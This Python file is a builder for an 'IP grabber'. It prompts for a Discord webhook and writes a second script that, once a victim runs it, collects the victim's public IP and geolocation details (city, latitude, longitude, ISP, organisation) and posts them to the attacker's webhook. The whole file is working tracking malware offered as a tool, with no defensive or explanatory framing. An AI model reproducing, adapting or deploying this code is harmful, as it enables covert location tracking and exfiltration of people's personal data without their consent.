import requests
import json
from dhooks import Webhook, Embed
from datetime import datetime
import os
from utils import *

ip = requests.get('https://api.ipify.org/').text 

def create_log_script(webhook_url):

    script_content = f"""
import requests
import json
from dhooks import Webhook, Embed
from datetime import datetime

hook = Webhook("{webhook_url}")

# Get current time
time = datetime.now().strftime("%H:%M %p")

# Get public IP address
ip = requests.get('https://api.ipify.org/').text  


r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
geo = r.json()

embed = Embed(title="Novex Business Log", color=0x00FF00)

fields = [
    {{'name': 'IP', 'value': geo.get('query', 'N/A')}},
    {{'name': 'ipType', 'value': geo.get('ipType', 'N/A')}},
    {{'name': 'Country', 'value': geo.get('country', 'N/A')}},
    {{'name': 'City', 'value': geo.get('city', 'N/A')}},
    {{'name': 'Continent', 'value': geo.get('continent', 'N/A')}},
    {{'name': 'IPName', 'value': geo.get('ipName', 'N/A')}},
    {{'name': 'ISP', 'value': geo.get('isp', 'N/A')}},
    {{'name': 'Latitude', 'value': geo.get('lat', 'N/A')}},
    {{'name': 'Longitude', 'value': geo.get('lon', 'N/A')}},
    {{'name': 'Org', 'value': geo.get('org', 'N/A')}},
    {{'name': 'Region', 'value': geo.get('region', 'N/A')}},
    {{'name': 'Status', 'value': geo.get('status', 'N/A')}},
]


for field in fields:
    if field['value']:
        embed.add_field(name=field['name'], value=field['value'], inline=True)


hook.send(embed=embed)
"""


    save_path = 'stats/IpGrabber/grabber.py'

    os.makedirs(os.path.dirname(save_path), exist_ok=True)

    with open(save_path, 'w') as file:
        file.write(script_content)

    print(f"{INPUT} Python log script has been successfully saved to {save_path}")


webhook_url = input(f"{INPUT} ENTER DISCORD WEBHOOK {Fore.LIGHTBLACK_EX}[{COLOR_L}INPUT HIDDEN{Fore.LIGHTBLACK_EX}]  ")


create_log_script(webhook_url)
